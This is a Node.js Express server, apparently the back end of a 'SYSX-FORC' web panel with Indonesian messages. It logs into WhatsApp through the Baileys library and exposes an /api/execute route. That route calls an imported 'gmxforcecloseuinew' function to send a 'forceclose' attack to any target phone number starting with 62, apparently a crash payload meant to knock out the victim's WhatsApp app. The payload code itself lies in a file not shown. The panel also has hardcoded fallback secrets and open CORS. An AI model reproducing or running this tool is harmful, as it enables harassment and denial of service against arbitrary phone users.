const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers } = require('@whiskeysockets/baileys');
const pino = require('pino');

const app = express();
const PASSWORD = process.env.PASSWORD || 'force$$$';

// ========== MIDDLEWARE ==========
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, '../public')));
app.use(session({
  secret: process.env.SESSION_SECRET || 'sysx-forc-secret',
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 3600000 * 24 }
}));

// ========== SESSION WHATSAPP ==========
let sock = null;
let isConnected = false;
let pairingCodeCache = null;

async function startWhatsAppSession() {
  try {
    const { state, saveCreds } = await useMultiFileAuthState('./auth_info');
    sock = makeWASocket({
      logger: pino({ level: 'silent' }),
      printQRInTerminal: false,
      browser: Browsers.ubuntu('Linux'),
      auth: state,
      syncFullHistory: false,
      markOnlineOnConnect: false
    });

    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;
      if (connection === 'open') {
        isConnected = true;
        console.log('🔥 WHATSAPP TERHUBUNG!');
      }
      if (connection === 'close') {
        isConnected = false;
        const reason = lastDisconnect?.error?.output?.statusCode;
        if (reason === DisconnectReason.loggedOut) {
          console.log('⚠️ LOGOUT, PAIRING ULANG!');
          setTimeout(startWhatsAppSession, 5000);
        }
      }
    });
    sock.ev.on('creds.update', saveCreds);
  } catch (err) {
    console.error('ERROR SESSION:', err);
  }
}

// ========== ROUTE LOGIN ==========
app.post('/api/login', (req, res) => {
  const { password } = req.body;
  if (password === PASSWORD) {
    req.session.loggedIn = true;
    req.session.user = 'Dale Andrews';
    res.json({ success: true, message: 'LOGIN BERHASIL!' });
  } else {
    res.status(401).json({ success: false, message: 'PASSWORD SALAH!' });
  }
});

app.get('/api/logout', (req, res) => {
  req.session.destroy();
  res.json({ success: true });
});

app.get('/api/check-session', (req, res) => {
  res.json({ loggedIn: !!req.session.loggedIn, user: req.session.user || null });
});

// ========== ROUTE PAIRING ==========
app.post('/api/pair', async (req, res) => {
  if (!req.session.loggedIn) return res.status(401).json({ error: 'LOGIN DULU!' });
  const { phoneNumber } = req.body;
  if (!phoneNumber || !phoneNumber.startsWith('62')) {
    return res.status(400).json({ error: 'NOMOR HARUS 62xxx!' });
  }

  try {
    if (!sock) await startWhatsAppSession();
    const code = await sock.requestPairingCode(phoneNumber);
    pairingCodeCache = code;
    res.json({ 
      success: true, 
      pairingCode: code,
      message: `PAIRING CODE: ${code}`
    });
  } catch (err) {
    res.status(500).json({ error: 'GAGAL PAIRING: ' + err.message });
  }
});

// ========== ROUTE EKSEKUSI FORCECLOSE ==========
app.post('/api/execute', async (req, res) => {
  if (!req.session.loggedIn) return res.status(401).json({ error: 'LOGIN DULU!' });
  const { target } = req.body;
  if (!target || !target.startsWith('62')) {
    return res.status(400).json({ error: 'TARGET HARUS 62xxx!' });
  }
  if (!sock || !isConnected) {
    return res.status(500).json({ error: 'WHATSAPP BELUM TERHUBUNG!' });
  }

  try {
    const targetJid = target + '@s.whatsapp.net';
    const { gmxforcecloseuinew } = require('../public/function.js');
    
    await gmxforcecloseuinew(sock, targetJid);
    res.json({ success: true, message: `🔥 FORCECLOSE DIKIRIM KE ${target}` });
  } catch (err) {
    res.status(500).json({ error: 'GAGAL EKSEKUSI: ' + err.message });
  }
});

// ========== ROUTE STATUS ==========
app.get('/api/status', (req, res) => {
  res.json({
    connected: isConnected,
    sessionActive: !!sock,
    loggedIn: !!req.session.loggedIn,
    user: req.session.user || null
  });
});

// ========== START SERVER ==========
if (require.main === module) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, async () => {
    console.log(`🔥 SYSX-FORC RUNNING DI PORT ${PORT}`);
    await startWhatsAppSession();
  });
}

module.exports = app;